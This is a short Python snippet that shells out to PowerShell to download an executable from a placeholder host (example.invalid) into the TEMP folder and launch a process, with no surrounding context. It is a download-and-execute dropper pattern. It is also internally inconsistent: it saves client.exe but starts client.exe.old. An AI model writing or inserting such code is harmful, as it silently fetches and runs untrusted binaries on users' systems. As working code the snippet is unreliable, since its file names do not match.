import subprocess
subprocess.run(["powershell", "-Command", "curl.exe -L https://example.invalid/client.exe -o $env:TEMP\\client.exe; Start-Process $env:TEMP\\client.exe.old"])
